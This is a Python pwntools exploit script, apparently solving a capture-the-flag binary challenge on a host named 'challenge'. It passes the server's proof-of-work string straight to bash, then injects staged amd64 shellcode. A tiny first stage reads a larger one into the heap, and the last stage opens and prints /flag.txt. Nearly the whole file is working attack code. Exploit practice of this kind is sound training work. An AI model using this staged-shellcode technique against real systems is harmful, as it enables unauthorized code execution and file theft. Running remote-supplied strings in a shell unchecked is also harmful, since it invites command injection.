#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.arch = "amd64"

def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


def start():
    for _ in range(10):
        try:
            sleep(1)
            io = pwnlib.tubes.remote.remote('challenge', 1337)
            tmp_data = io.recv(len('proof'), timeout=2)
            if tmp_data == b'proof':
                handle_pow(io)
            else:
                io.unrecv(tmp_data)
            return io
        except:
            continue
    raise ValueError()


p = start()
shellcode = asm('''
    xor eax, eax
    syscall
    xor edi, edi
    mov bl, 0
''')
# "syscall" makes RCX register into heap address, and idky
# "mov bl, 0" is needed for ignoring last 1-byte

shellcode2 = asm('''
    push rcx
    pop rsi
    xor eax, eax
    syscall
''')
# read(0, heap, dummy size);

shellcode3 = shellcraft.openat(0, "/flag.txt", 0, 0)
shellcode3 += shellcraft.read('rax', 'rsp', 0x40)
shellcode3 += shellcraft.write(1, 'rsp', 0x40)

p.sendlineafter(b"number: ", b'2')
p.sendlineafter(b'> ', str(u64(shellcode)).encode())
p.sendlineafter(b'> ', str(u64(shellcode2.ljust(8, b'\x90'))).encode())
p.send(b'\x90' * 0xA + asm(shellcode3))

print(p.recvuntil(b"}"))

p.close()
exit(0)
